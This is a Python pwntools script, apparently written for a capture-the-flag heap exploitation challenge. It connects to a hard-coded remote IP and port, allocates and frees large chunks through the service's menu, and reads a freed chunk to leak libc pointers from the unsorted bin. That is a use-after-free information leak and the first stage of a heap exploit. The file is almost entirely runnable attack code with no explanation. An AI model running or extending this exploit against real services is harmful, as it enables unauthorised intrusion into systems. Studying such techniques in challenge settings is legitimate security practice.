from pwn import *
import struct

context.log_level='error'
HOST='52.76.96.108'; PORT=9005

def roundtrip():
    p=remote(HOST,PORT)
    p.recvuntil(b'> ')
    return p

def create(p, idx, size, data):
    p.sendline(b'1'); p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); p.recvuntil(b'size: ')
    p.sendline(str(size).encode()); p.recvuntil(b'data: ')
    p.send(data); return p.recvuntil(b'> ', timeout=2)

def delete(p, idx):
    p.sendline(b'3'); p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); return p.recvuntil(b'> ', timeout=2)

def readn(p, idx):
    p.sendline(b'4'); p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); return p.recvuntil(b'> ', timeout=2)

def getdata(r, n):
    idx=r.find(b'data: ')
    data=r[idx+6:idx+6+n]
    return data

# Test: can we create large chunk?
p=roundtrip()
print("create 0x500:", create(p,0,0x500,b'A'*0x4ff+b'\n')[:120])
p.close()

# Test unsorted libc leak
p=roundtrip()
create(p,0,0x500,b'A'*0x4ff+b'\n')
create(p,1,0x500,b'B'*0x4ff+b'\n')
create(p,2,0x20,b'C'*0x1f+b'\n')  # guard so big not merged
print("del0:", delete(p,0))
r=readn(p,0)
data=getdata(r,0x10)
print("read chunk0 after free:", data.hex())
print("leak ptr0=",hex(struct.unpack('<Q',data[:8])[0]))
print("leak ptr1=",hex(struct.unpack('<Q',data[8:16])[0]))
p.close()
